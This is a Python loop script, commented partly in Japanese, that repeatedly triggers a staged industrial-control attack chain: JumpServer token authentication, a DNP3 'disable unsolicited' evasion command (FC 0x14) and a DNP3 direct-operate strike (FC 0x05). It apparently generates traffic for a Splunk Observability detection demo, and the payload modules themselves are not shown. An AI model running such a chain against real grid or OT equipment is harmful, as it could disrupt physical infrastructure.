#!/usr/bin/env python3
"""
attack_loop.py
Splunk Observability Cloud でのリアルタイム確認用に、攻撃キルチェーン（Stage 1～3）を持続的に繰り返し実行するループスクリプト
"""

import time
import sys
from attack_stage1_pivot import authenticate_jumpserver, VALID_TOKEN
from attack_stage2_3_strike import execute_stage2_evasion, execute_stage3a_dnp3_strike, execute_stage3b_snmp_ups_shutdown

def continuous_attack():
    print("===========================================================================")
    print("[Continuous OOB Attack Generator] Starting continuous attack loop...")
    print("Press Ctrl+C to stop.")
    print("===========================================================================")
    
    count = 1
    while True:
        try:
            # Alternate OOB Toggle for A/B Testing (Phase 3 vs Phase 2)
            current_use_oob = (count % 2 != 0)
            phase_name = "Phase 3 (OOB ON)" if current_use_oob else "Phase 2 (OOB OFF)"
            
            print(f"\n--- [Iteration #{count}] Triggering Stage 1-3 Attack Chain [{phase_name}] ---")
            
            # Stage 1: JumpServer Auth
            auth_res = authenticate_jumpserver(VALID_TOKEN)
            print(f"  [1/3] JumpServer Auth: Status {auth_res['status']}")
            
            # Stage 2: Disable Unsolicited
            execute_stage2_evasion()
            print(f"  [2/3] DNP3 Evasion (FC 0x14) Sent.")
            
            # Stage 3a: DNP3 Strike with OOB Hook
            execute_stage3a_dnp3_strike(use_oob=current_use_oob)
            print(f"  [3/3] DNP3 Strike (FC 0x05) Sent!")
            
            count += 1
            time.sleep(3) # 3秒感覚で繰り返し発生
            
        except KeyboardInterrupt:
            print("\n[Continuous OOB Attack Generator] Stopped by user.")
            break
        except Exception as e:
            print(f"Error in attack loop: {e}")
            time.sleep(3)

if __name__ == "__main__":
    continuous_attack()
